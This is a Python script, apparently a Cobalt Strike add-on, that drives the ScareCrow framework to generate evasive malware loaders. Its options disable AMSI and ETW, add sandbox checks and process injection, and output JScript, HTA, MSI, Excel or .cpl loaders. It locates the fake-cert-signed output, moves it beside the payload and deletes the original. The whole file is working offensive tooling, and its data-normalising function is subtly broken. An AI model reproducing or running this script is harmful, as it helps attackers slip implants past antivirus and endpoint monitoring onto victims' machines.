#!/usr/bin/python3
import os.path
from json import loads
from sys import argv, exit
from subprocess import check_output, Popen, PIPE, call


def generate_payload(data):
    command = [data['scarecrow_executable'], '-I', data['payload'], '-Loader', data['loader'], '-domain', data['domain']]

    if data['noamsi']:
        command.append('-noamsi')

    if data['noetw']:
        command.append('-noetw')

    if data['nosleep']:
        command.append('-nosleep')

    if data['sandbox']:
        command.append('-sandbox')

    if data['injection']:
        command.append('-injection')
        command.append('{}'.format(data['injection']))

    if data['loader_name']:
        if not data['loader_name'].endswith('.js') and not data['loader_name'].endswith('.hta'):
            response_message("[!] Please select .js or .hta loader for the payload.")
        command.append('-O')
        command.append(data['loader_name'])

    filename = "Loader.js"
    if data['loader_name'] and data['loader'] in ["control", "excel", "msiexec", "wscript"]:
        filename = data['loader_name']
    elif not data['loader_name'] and data['loader'] in ["excel", "msiexec", "wscript"]:
        command.append('-O')
        command.append(filename)
    
    process = Popen(command, stdout=PIPE)
    stdout, stderr = process.communicate()    
    
    if data['loader'] in ["binary", "dll", "control"]:
        for row in stdout.decode('utf-8').splitlines():
            if row.startswith('[*] Signing'):
                filename = row
                break

        filename = filename.split('[*] Signing ')[1].split(' With a Fake Cert')[0]

        if data['loader'] == "control" and not data['loader_name']:
            filename = filename[:-3] + "cpl"

        elif data['loader'] == "control" and data['loader_name']:
            filename = data['loader_name']

    call(['mv', data['cobaltstrike_directory'] + '/' + filename, os.path.dirname(data['payload']) + "/"])
    
    check_output(['rm', '-f', data['payload']])

    response_message("Payload successfuly generated at: " + os.path.dirname(data['payload']) + "/" + filename)


def normalize_data(json_data):
    try:
        data = {}
        for key, value in json_data.items():
            if value == "false" or value == "":
                value = False
            if value == "true":
                value == True

            data[key] = json_data[key]

        return data

    except Exception:
        response_message("Error - Something went wrong normalizing the data.")


def response_message(message):
    print(message)
    exit()

if __name__ == '__main__':
    cobaltstrike_data = loads(argv[1:][0])
    cobaltstrike_data = normalize_data(cobaltstrike_data)

    generate_payload(cobaltstrike_data)

